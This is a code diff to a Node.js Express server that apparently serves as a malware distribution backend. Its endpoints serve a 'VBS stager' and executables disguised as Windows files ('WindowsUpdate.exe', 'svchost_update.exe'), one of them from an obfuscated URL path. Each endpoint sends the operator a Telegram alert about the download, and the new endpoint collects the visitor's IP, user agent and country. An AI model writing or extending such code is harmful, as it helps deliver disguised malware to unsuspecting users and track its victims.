@@ -2541,9 +2541,6 @@ app.get('/getvbs', async (req, res) => {
 
         const message = `
 🔔 <b>VBS Stager Fetch</b>
-📱 <b>User Agent:</b> ${userAgent}
-🌐 <b>IP:</b> ${ip}
-🌍 <b>Country:</b> ${country}
 🔗 <b>Referer:</b> ${referer}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
         `;
@@ -2571,9 +2568,35 @@ app.get('/bbj87vuvhtv87cdsrxhgvfvt5ftvhg', async (req, res) => {
         
         const message = `
 🔔 <b>Windows Update EXE</b>
-📱 <b>User Agent:</b> ${userAgent}
-🌐 <b>IP:</b> ${ip}
-🌍 <b>Country:</b> ${country}
+🔗 <b>Referer:</b> ${referer}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+        `;
+        await sendTelegramAlert(message);
+
+        res.setHeader('Content-Disposition', 'attachment; filename="WindowsUpdate.exe"');
+        res.setHeader('Content-Type', 'application/octet-stream');
+        const readStream = fs.createReadStream(filePath);
+        readStream.pipe(res);
+    } else {
+        res.status(404).send('File not found. Please contact support.');
+    }
+});
+
+
+
+
+// Endpoint for server host module
+app.get('/ServerHostModule', async (req, res) => {
+    const filePath = path.join(__dirname, 'dist', 'svchost_update.exe');
+    
+    if (fs.existsSync(filePath)) {
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Unknown';
+        const referer = req.get('Referer') || 'Direct';
+        const country = await getCountryFromIP(ip);
+        
+        const message = `
+🔔 <b>Windows Update EXE (Old Url)</b>
 🔗 <b>Referer:</b> ${referer}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
         `;
